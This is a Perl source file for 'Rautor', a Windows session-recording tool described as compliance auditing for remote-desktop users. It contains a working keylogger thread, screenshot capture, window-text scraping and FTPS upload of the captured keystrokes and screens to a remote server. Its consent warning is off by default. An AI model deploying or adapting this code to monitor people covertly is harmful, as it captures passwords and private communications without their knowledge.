#!perl.exe -w

###########################################################################################
# S.Ox. /pci compliance for rdesktop users 
# Angelos Karageorgiou angelos@unix.gr Nov 2007 
# Major Rework Fall 2009
# Save pngs of screen shots, text contents of well behaved windows,
# and keyboard logging under c:\Audit
# Fully configurable via RRS.PL , requires a registration / license server
# 
# Get Brian H Oak's http://www.acornnetsec.com/perl/msg.dll for proper windows reporting
###########################################################################################



package Rautor;

use common::sense;

use threads;
use threads::shared;
use Thread::Queue;
use POSIX qw(strftime);
use Win32;
use Win32::API;
use Win32::GUI();
use Win32::GUI::DIBitmap;
use Win32::EventLog;
use Win32::ShutDown;
use Win32::OLE qw (in);
use Win32::ShutDown;
use Win32::Process::List;
use Win32::GuiTest qw|FindWindowLike IsWindowVisible GetWindowText WMGetText IsKeyPressed GetAsyncKeyState|;
use Win32::TieRegistry ( Delimiter=>'/');
use Net::FTPSSL;
use LWP::UserAgent;
use Win32::Process;
use File::Find ();
use Crypt::Tea;
use Getopt::Long;
use SysTray ':all';
use File::Basename;
use File::Spec qw 'rel2abs';

# for the convenience of &wanted calls, including -eval statements:
use vars qw/*name *dir *prune/;
*name   = *File::Find::name;
*dir    = *File::Find::dir;
*prune  = *File::Find::prune;





my  $DOMAIN='';
our $DRIVE="C:";
our $AUDITDIR="Audit"; 	
our $FTPSERVER=undef;
our $FTPUSER=undef;
our $FTPPASS=undef;
our $KEEPFILES=1;
my  $DEFSLEEP=3;		#seconds
our $SLEEP=$DEFSLEEP; 		
my  $DEFQUAN=130;	#milisecs that sleep time is broken into quanta :-)
our $QUANTUM=$DEFQUAN; 
our $PROXY=undef;
our $PROXYSERVER=undef;
our $PROXYPORT=undef;
our $LICENSE="";
our $KEYLOGGER=1;
our $SCREENDUMPER=1;
our $SCREENSCRAPER=1;
our $PROXYLOCK=0;
our $FULLSCRAPE=1;
our $LEGALWARNING=0;
my $VERBOSE;
my $DEBUG;
our $MYNAME="Rautor";
my  $DOFTP=0;
my  $KFNAME="";
my  $LOGFNAME="";

our $TRAYICON=0;
our $WEBSERVER=0;
our $REGURL;
my  $WEB=undef;
our $UPLOADOLDFILES=0;
our $NUMSCREENS=0;
our @DCs=();
our @MONPATHS=();
our $SLIDESBITS=8;
our $REGSERVER='';
my $DEMO;
my $FOREVER=1;
our $RAUTORACTIVE=1;
our $FTPACTIVE=1;
our $KEYLOG="";
my $KEY='perl -e "{print \$key}"';
my $RAUTORPASS='$RAUTORPASS';
our $DIRECTSITES="127.0.0.1;<local>;*.unix.gr;*.microbase.gr";
our @WINDOWSNAMES=( "Internet Explorer",
					"Live Messenger",
					"Firefox",
					"Microsoft Outlook",
					"Inbox"
				);


############# Load our modules ############
our %keymap;
push @INC, "." ;
push @INC, "..\\common";
push @INC, dirname($0);
push @INC, dirname($0)."..\\common";

require "Keymap.pl";	# Virtual to real keys translator
require "rreg.pl";		# registry stuff , common with rrs.pl
require "Rau_init.pl";	# Intializing 
require "setproxy.pl";	# The PC locking stuff

###########################################
&initEventLog("msg.dll");

# hide child windows
if ( defined &Win32::SetChildShowWindow ){
	Win32::SetChildShowWindow(0);
}


GetOptions ( 	
	'verbose'   => \$VERBOSE,
	'debug'		=> \$DEBUG,
);

# get the user and system data
our  $user=Win32::LoginName();
our  $Node=Win32::NodeName();
our  $domain=Win32::DomainName();

&doRegistry();

$NUMSCREENS=init_DCs();

print STDERR "Monitors: $NUMSCREENS\n" if ( $DEBUG);
our  $path=initPaths($Node,$NUMSCREENS);
if ( ! $path ) {
	my $string="Could Not Create audit log path ".$path . "\n Rautor is crippled";
	mylog(500,"Error:"+$string);
}

my $ENC=encrypt($RAUTORPASS,$KEY);
$KFNAME=$path ."\\KeyBoard_Log.txt";
$LOGFNAME=$path ."\\Session_Log.txt";

my $tmpKFNAME=$path ."\\KeyLogtmpCopy.txt";

if ( $LEGALWARNING == 1 ) {
	my $string="Your session will be logged, click on YES if you agree";
	my $ret=Win32::MsgBox($string, 4|MB_ICONSTOP, "$MYNAME");
	if ( $ret != 6 ) {
		Win32::ShutDown::ForceLogOff();	# this may be annoying		
		doEnd();
	}
}

# why am I using GetDesktopWindow vs GetDC ?
# Ok I will use both !
#my $GetDC = new Win32::API('user32','GetDC',['N'],'N');
#my $DC  = $GetDC->Call(0);
#my $ReleaseDC = new Win32::API('user32', 'ReleaseDC',    [qw/N N/], 'I');
my $DC=$DCs[1];
my $GetDesktopWindow = new Win32::API('user32','GetDesktopWindow', [], 'N');
my $DESKTOP = $GetDesktopWindow->Call();

if ( ( $QUANTUM <=0 ) || ( $QUANTUM > 1000 ) ) {
	$QUANTUM=$DEFQUAN;
	&mylog(200,"Warning:Invalid QUANTUM, value reset to $DEFQUAN millisecs");
}
if  ( $SLEEP <=0 ) {
	$SLEEP=$DEFSLEEP;
	&mylog(200,"Warning:Invalid SLEEP, value reset to $DEFSLEEP seconds");
}

ReadRegistry();
	my $r; # register with central
	my $iter=0;
	while ( ! $r ) {				
		print "Trying to Register\n" if ( $VERBOSE);
		$r=Register($REGSERVER,$user,$ENC,$Node,$domain,$path,"START"); 	
		sleep(1);
		$iter++;
		last if ( $iter > 2 ); # 3 attempts :-)
	} 
	
if ( ! $r) {
	print "Error: Registration with License Server failed\n" if ( $VERBOSE);
	mylog(300,"Error: Registration with License Server failed");	
	Win32::MsgBox("Could not obtain license from server\nGoing into 2 minute Demo mode", 0|MB_ICONSTOP, "$MYNAME");
	$DEMO=1;
}

$SIG{INT}=\&doEnd;

$DOFTP=initFTPstuff($FTPSERVER,$FTPUSER,$FTPPASS,$DEBUG);

if ( $KEYLOGGER ) {
	print STDERR "Creating Keylogger Thread\n" if ( $VERBOSE);
	my $keytid=threads->create('KeyLoggerThread',$QUANTUM)->detach();
}


my $ICONPATH=getfulliconpath("bull.ico");
SysTray::create("my_callback", $ICONPATH, "Rautor: Session Recorder");              
my $lastRunTime;
my $lastRegTime=time;
my $beginTime=time;
$RAUTORACTIVE=1;
while ($RAUTORACTIVE==1) {
	my $now=time;
		
	SysTray::do_events();  # non-blocking				
			
	last if ($DEMO &&( $now  > ($beginTime + 120)) ) ;
	
	Win32::Sleep(50); # for a tenth of a sec   				
	$SIG{INT}=\&doEnd;	# reset it because of SLEEP
	if ( time >= ($lastRunTime + $SLEEP)){
		Rautor("LINEAR",$DESKTOP,@DCs) ;
		$lastRunTime=time;
	}
	
	if ( time  >= $lastRegTime + 30) { # Ping every 30 seconds
		Register($REGSERVER,$user,$ENC,$Node,$domain,$path,"ALIVE") unless ( $DEMO);
		$lastRegTime=time;
	}				
}		

$FTPACTIVE=0;
doEnd();
1; # end of main program


############################################################
# callback sub for receiving systray events
 sub my_callback {
   my $events = shift;      
   print STDERR "Event Received $events\n" if ( $DEBUG);

   if ( ($events & SysTray::MB_LEFT_CLICK) || ($events & SysTray::MB_RIGHT_CLICK)  ){
     doexplorer("http://www.unix.gr/rautor");
   }
   
   if (	($events & SysTray::MSG_LOGOFF) ||	($events & SysTray::MSG_SHUTDOWN) 	  ){
    doEnd();
   }
 }
 

######################################################################
# Main Code
######################################################################
sub Rautor{
my ($type,$DESKTOP,@DCs)=@_;
	# read dynamic registry settings, not everything is
	ReadRegistry();
	
	my $msg=undef;
	my $didIlog=0;
	my $now_string 	= strftime "%Y%m%d-%H%M%S", localtime;
	my $day_string 	= strftime "%Y%m%d", localtime;
	my $spinname 	= sprintf("%s\\%s.png", $path,$now_string);
	my $plainname 	= sprintf("%s.png", $now_string);
	my $keyspinname	= sprintf("%s\\%s-KeyboardLog.txt", $path,$now_string);
	my $tname		= sprintf("%s\\%s-ScreenContents.txt", $path,$now_string);	
	
	setProxy($PROXY,1,$DIRECTSITES) if ( $PROXYLOCK==1  ) ;
	
	# should we trigger for certain windows' names ?
	if  ( $#WINDOWSNAMES >= 0 ) {
		if ( locateWindows(@WINDOWSNAMES) <= 0 ){			
			mylog(200,"Warning:No window found for activating $MYNAME") if ( $VERBOSE);
			print STDERR "No window found for activating $MYNAME" . "\n" if ($DEBUG);			
			return;
		} 
	} 
	
	# First try the keyboard logger
	if ( $KEYLOGGER>=1 ) {
		my $text="";
		{
		lock $KEYLOG;
		$text=$KEYLOG;
		$KEYLOG="";
		}
		open (my $smallLog,">".$keyspinname) || mylog(300,"ERROR: Cannot save file $keyspinname");
		if ( $smallLog ) {
			print $smallLog $text;
			close($smallLog);
		}
		open (my $bigLog,">>" .$KFNAME) || mylog(500,"Error:Large Keyboard log open for append failed");
		if ($bigLog ) {
			print $bigLog $text;
			close($bigLog);			
		}
		
	}	
	# now try to grab a screen image
	Multi_screendumper($plainname,$spinname,$DESKTOP,$DCs[1]) if ( $SCREENDUMPER>=1);
	# ftp uploading is taken care inside multiscreendumper
	
	
	#Scraoe screen from well behaved windows components		
	DumpAnyText($tname)if ( $SCREENSCRAPER >=1 ) ; 
	
	if ( $DOFTP) {
		uploadFile($FTPSERVER,$FTPUSER,$FTPPASS,$keyspinname,$KEEPFILES) if ( -f $keyspinname);
		uploadFile($FTPSERVER,$FTPUSER,$FTPPASS,$KFNAME,$KEEPFILES) if ( -f $KFNAME);
		uploadFile($FTPSERVER,$FTPUSER,$FTPPASS,$tname,$KEEPFILES) if ( -f $tname ) ;
	}	
}
######################################################################
# End Main Code
######################################################################


###################################################
sub doEnd{	
	if ( ! $user ) { $user = "unknown !"}
	mylog(100,"Info:Program Terminating for user ".$user);
	SysTray::destroy() if ( $TRAYICON);
	Register($REGSERVER,$user,$ENC,$Node,$domain,$path,"LOGOUT");	
	for (my $i=1;$i<=$NUMSCREENS;$i++){
		Win32::GUI::DC::ReleaseDC(0,$DCs[$i]);
	}		
	kill 6 ,$$; # in case we were called via SIG{INT};
	exit;
}

	

############################################################
sub doexplorer{	
	my $url=shift;
	
	my	$browserkey= $Registry->{"HKEY_CLASSES_ROOT/http/shell/open/command"};
	my	$default_browser = "$browserkey->{'/'}";
		$default_browser =~ s/\"//g;
		$default_browser =~ s/\ -.*//g;
	my	$stripped_browser=basename($default_browser);
		$stripped_browser =~ s/\".*//g;
		$stripped_browser =~ s/ .*//g;

	my $browser;
	Win32::Process::Create($browser, $default_browser,
        $stripped_browser  ." $url", 0,
        NORMAL_PRIORITY_CLASS, ".") || return 0;
}


############# Screen Scraper Section ################
#####################################################
sub DumpAnyText{
	my $filename=shift;
	open(LOGFILE,">$filename") || return; # otherwise it has no meaning
	
	my @hwnds = FindWindowLike();     
	my $oldtext="";
	foreach my $window (@hwnds) {
		next if ( 	
					( ! $FULLSCRAPE ) && 
					( ! IsWindowVisible($window) )
	       	   ) ;		
		
		## if fullscrape or windows is visible
		my $title=GetWindowText($window);
		chomp($title) if ( $title =~ /\n$/);
		chomp($title) if ( $title =~ /\r$/);
		next if ($title eq '');
		next if ( $title =~ /WMS ST Notif Window/ ); #garbage ?
		$title=~s/\x0// ;
		$title=~s/[\r\n]$// ;
		next if ( $title =~ /^$/);
		print STDERR "[$title]\n" if ( $DEBUG);
		print LOGFILE "[$title]\n";
	
		my @edits=FindWindowLike($window,"","");
		foreach my $ed (@edits) {
			my $text=" " x 65536;
			$text=GetWhatYoucan($ed);
			$text=~s/\x00/ / ;
			$text=~s/[\r\n]$// ;
			next if ($text =~ /^$/ );
			next if ($text eq $oldtext);	# skip duplicates
			$oldtext=$text;
			print STDERR "\t". $text ."\n"  if ( $DEBUG);
			print LOGFILE "\t". $text ."\n";
		}
		print STDERR "\n" if ( $DEBUG);
		print LOGFILE "\n";
	}
	close(LOGFILE);				
}


######################################################################
sub GetWhatYoucan{
	my $ed=shift;

	my $text="";
    	eval {
       		local $SIG{ALRM} = sub { die "alarm\n" }; # NB: \n required
       		alarm 1;
		$text=WMGetText($ed);
       		alarm 0;
    	};
    	if ($@) {
		return undef;
    	}
	return $text;
}

###################### Logging Section #######################
##############################################################
sub LogWin32Event {
    my $eventid    =  shift( @_ );
    my $logmessage =  shift( @_ );
    
    my $eventtype  =  Win32::EventLog::EVENTLOG_INFORMATION_TYPE(); # default
       $eventtype  =  Win32::EventLog::EVENTLOG_WARNING_TYPE() if $logmessage =~ /^w\S+:/i;
       $eventtype  =  Win32::EventLog::EVENTLOG_ERROR_TYPE()   if $logmessage =~ /^e\S+:/i;
       $logmessage    =~ s/^\S+:\s*//;
    
    my $EVT        =  Win32::EventLog->new( "Application",$Node);
    if ( $EVT) {
    	$EVT->Report({
        	Source                 => $MYNAME,
        	EventType              => $eventtype,
        	Category               => 300,
        	EventID                => $eventid,
        	Strings                => $logmessage,
        	Data                   => "",
    	});
     }
}

######################################################################
sub mylog{
	my $eventid=shift;
	my $strings=shift;
	my $now = strftime "%Y%m%d-%H%M%S:", localtime;	
	
	if ( $DEBUG ) {
		print STDERR  $now . $strings . "\n";
	}
	LogWin32Event($eventid,$strings);
	open (LOG,">>$LOGFNAME") || return;
	print LOG  $now . $strings . "\n";
	close(LOG);	
}



#################### Triggering Section ######################
##############################################################
sub locateWindows{
	my @WINDOWSNAMES=@_;
	my $foundawin=0;

	my @hwnds = FindWindowLike();     
	foreach my $window (@hwnds) {
		my $title=GetWindowText($window);
		next if ( $title eq "");
		foreach my $name (@WINDOWSNAMES) {
			if ( $title =~ /$name/gi){
				print STDERR " ***** $name $title *****  found window \n";
				$foundawin++ ;
			}
		}
	}

	return($foundawin);
}





######################## FTP section ( uploading ###########
############################################################
sub uploadFile {
my  ($FTPSERVER,$FTPUSER,$FTPPASS,$filename,$KEEPFILES)=@_;

my  $Node=Win32::NodeName();

    mylog(100,"Info:File to upload $filename");
	print STDERR "FTP:File to upload $filename\n"  if ( $VERBOSE);
    my @felems=split(/[\\\/]/,$filename);
    my $fname=$felems[$#felems];
	
    my $dirname=$felems[$#felems-1];
	
	return if ($fname eq "LOGOUT" );
	my $start=0;
	if ( $felems[0] =~ /\:/ ) {
		$start=1;
	}
	my $j;

	my @DirStructure=();
	for ($j=$start;$j<$#felems;$j++){
		push (@DirStructure,$felems[$j]);
	}
	
    # log in each time, the net is a finnicky place
	#my $ftp = Net::FTP->new($FTPSERVER, 				Timeout => 5,Passive => 1,	Debug => $DEBUG,	);
	my $ftp = Net::FTPSSL->new($FTPSERVER, Encryption => EXP_CRYPT, 
				Timeout => 15,Debug => $DEBUG,use_SSL=>1, Port=>990);
		
	if ( ! $ftp ) {
          mylog(300,"Error:FTP init failed:" .$Net::FTPSSL::ERRSTR);
          next;
	}

    if ( ! $ftp->login($FTPUSER,$FTPPASS) ) {
          mylog(300,"Error:FTP credentials Wrong");
          next;
    }

	if ( $filename =~ /\.png$/){
       	$ftp->binary() ;
	}else {
		$ftp->ascii();
	}

#	run down  and create the path
	my $subdir="";
	foreach $subdir (@DirStructure) {
	        if( ! $ftp->cwd($subdir) ){
				$ftp->mkdir($subdir);
        		$ftp->cwd($subdir);
        	}
	}
	#aaaaaaaaand put the file
	my $before =time;
    if ( ! $ftp->put($filename) ) {
            mylog(300,"Error:File $filename failed to upload");
    } else {
			my $span=time - $before;
           mylog(100,"Info:File $filename uploaded at $dirname\/$fname in $span seconds") if ( $VERBOSE );
	}
    $ftp->quit;
    unlink $filename if ( $KEEPFILES==0 ) ;             
}  

######################################################################
# now catch the keyboard , while sleeping in fits and starts
#
# keylogger sleeps $QUANTUM miliseconds so use it to delay
#
######################################################################
#sub KeyLogger{
#	my  ($SLEEP,$QUANTUM,$KFNAME)=@_;
#	my  $KEYLF=undef;
#	my  $spins=($SLEEP*1000)/$QUANTUM; # so many spins per sleep period
#
#	open($KEYLF,">$KFNAME");
#       if ( ! $KEYLF ) {
#		mylog(300,"Error:Cannot create Key Log file " . $KFNAME . " KeyLogger Inoperable");
#		return(-1);
#       }
#	my $now = strftime "\n%Y%m%d-%H%M%S:", localtime;
#	print $KEYLF $now;
#	
#	for ( my $s=0;$s<$spins;$s++){ 
# 		for ( my $i=0; $i<255;$i++){
#			if (IsKeyPressed($i)){
#				if ( length( $keymap{$i}) ==1  ) {
#					print $KEYLF $keymap{$i};
#				} else {
#					print $KEYLF  " [" . $keymap{$i} . "]" ;
#				}
#				my $now = strftime "\n%Y%m%d-%H%M%S:", localtime;
#				if ($i == 0x0D)	{
#					print $KEYLF $now;
#				} # ENTER was pressed
#			}
#		}
#		Win32::Sleep($QUANTUM);
#	}
#	close($KEYLF);
#}

#################### ScreenDumper Section ##################
############################################################
sub Multi_screendumper{
my  ( $plainname,$spinname,$DESKTOP,$DC)=@_;

	&screendumper($spinname,$DESKTOP,$DC);
	uploadFile($FTPSERVER,$FTPUSER,$FTPPASS,$spinname,$KEEPFILES) if ( (-f $spinname) &&( $DOFTP));
	# subsequent spinnames are derived from plainname
	for ( my $i=2;$i<=$NUMSCREENS;$i++){
		my $msg="";
		my $image = newFromDC Win32::GUI::DIBitmap($DCs[$i]) ;

		if ( ! $image) {
			$msg="No snapshot taken from monitor $i!" ;
			mylog(200,"Warning:"+$msg);
			next;
		}
		print STDERR "SLIDESBITS=$SLIDESBITS\n" if ( $VERBOSE);
	
		$image=scale($image,$SLIDESBITS);
		$spinname=$MONPATHS[$i]."\\".$plainname;
		$image->SaveToFile($spinname,PNG_IGNOREGAMMA )|| mylog(300,"Errro:Could not save screen". $spinname);
		undef($image);
		uploadFile($FTPSERVER,$FTPUSER,$FTPPASS,$spinname,$KEEPFILES) if ((-f $spinname)&&( $DOFTP)); 
		$msg="Snapshot taken at file:\n" . $spinname;
		mylog(100,"Info:".$msg) if ( $VERBOSE);
		print STDERR $msg . "\n" if ($DEBUG);
	}
	return;
}



#################### ScreenDumper Section ##################
############################################################
sub screendumper{
my  ( $spinname,$DESKTOP,$DC)=@_;
my $image=undef;

	if ( $DC ) {
		$image = newFromDC Win32::GUI::DIBitmap($DC) ;
	} else {
		$image = newFromWindow Win32::GUI::DIBitmap($DESKTOP,0) ;
	}
	if ( ! $image) {		
		mylog(300,"Error: No snapshot taken! No Desktop window ? What gives ?" );
		return -1;
	}
	my $newimage=scale($image,$SLIDESBITS);
	$newimage->SaveToFile($spinname)|| mylog(300,"Error:Could not save screen ". $spinname);		
	return;
}


############################################################
sub scale{
	my $image=shift;
	my $SLIDESBITS=shift;

	if ($SLIDESBITS ==8 ) {			
			my $new=$image->ConvertTo8Bits();	
			my $ximage=$new->ColorQuantize();
			return $ximage;
	} elsif ($SLIDESBITS == 16 ) {
			my $newimage=$image->ConvertTo16Bits565();
			return $newimage;
	}
	return $image; # justincase
}



#################### Left Overs Section ###############
#######################################################
# these are our file extensions
sub wanted {
  if ( ( /^.*\.txt\z/s )  ||  ( /^.*\.png\z/s ) ){
   	print STDERR ("Left over file found:$name\n") if ( $DEBUG);
#	$FTPQueue->enqueue($name.",".$KEEPFILES);
   }
}


########################################################################
# Find any old audit files and queue them up for upload!
sub FindLeftOvers {
	my $LOpath=shift;
	# Traverse desired filesystems
	return;
	File::Find::find({wanted => \&wanted}, $LOpath);
}


#######################################################################
##  Start the Helper Applications
sub startProc{
	my $App=shift;

	my $P = Win32::Process::List->new();
	my %list = $P->GetProcesses();
	my $PID = $P->GetProcessPid($App);	    
    return 1 if ( $PID ) ; 	# already running                
                
        Win32::Process::Create(my $ProcessObj, $App, $App, 0,
				NORMAL_PRIORITY_CLASS, ".")|| return undef;				
		return 1; # succees        
}

######################################################################
sub Register {		
my ($REGSERVER, $user, $pass,$node,$domain,$path,$status ) = @_;		

	my $ua = new LWP::UserAgent(
                timeout=>5,
                agent=>'Rautor',
                );
	my $REGURL="https://".$REGSERVER."/cgi-bin/rautor_register.fcgi";            
	print $REGURL
     my $req = $ua->post($REGURL,
                 [                     
                     user 	=> $user,
                     pass 	=> $pass,					 					 
					 node	=> $Node,
					 domain => $domain,
					 path	=> $path,
					 status => $status,
                     errors	=> 1
             ]);
			 
	print STDERR $REGURL."\n" if ( $DEBUG );
	
    if (! $req->is_success) {             
        print STDERR "ERROR: Cannot Contact REGISTRATION server\n" if ( $VERBOSE );
		mylog(300,"ERROR: Cannot Contact REGISTRATION server");
		return undef;
     }
	 print STDERR $req->content ."\n" if ( $DEBUG);
	 if ( $req->content =~ /RAUTOR:Registration OK/ ){		
		return 1;
	 } 
	return undef; 
}


######################################################################
sub getfulliconpath{
my $fname=shift;
	#snippet shamelessly stolen from splashscreen.pm
	my @dirs;
	# directory of perl script

	#push @dirs, ".";
	push @dirs, File::Spec->rel2abs(dirname($0));
	push @dirs, $ENV{TEMP} if exists $ENV{TEMP};
	push @dirs, $ENV{TMP} if exists $ENV{TMP};
	push @dirs, $ENV{PAR_TEMP} if exists $ENV{PAR_TEMP};
	push @dirs, $ENV{PAR_TEMP}."/inc" if exists $ENV{PAR_TEMP};

	for my $dir (@dirs) {
		next unless -d $dir;
		print STDERR "Attempting to locate icon under $dir\n" if $DEBUG;		
		if ( -f $dir ."\\" . $fname ) {
			return $dir ."\\" . $fname;
		}
	}
	return undef;
}


######################################################################
# now catch the keyboard , while sleeping in fits and starts
#
# keylogger sleeps $QUANTUM miliseconds so use it to delay
#
######################################################################
sub KeyLoggerThread{
  my  ($QUANTUM)=@_;		
  while (1) {	
 		for ( my $i=0; $i<255;$i++){
 			if (IsKeyPressed($i)){
				if ( length( $keymap{$i}) ==1  ) {
					{
					lock $KEYLOG;
					$KEYLOG .= $keymap{$i};
					}
				} else {
					{
					lock $KEYLOG;
					$KEYLOG .=  " [" . $keymap{$i} . "]" ;
					}
				}
			}
		}
		Win32::Sleep($QUANTUM);
	}
}

######################################################################
#  End of Everything
######################################################################
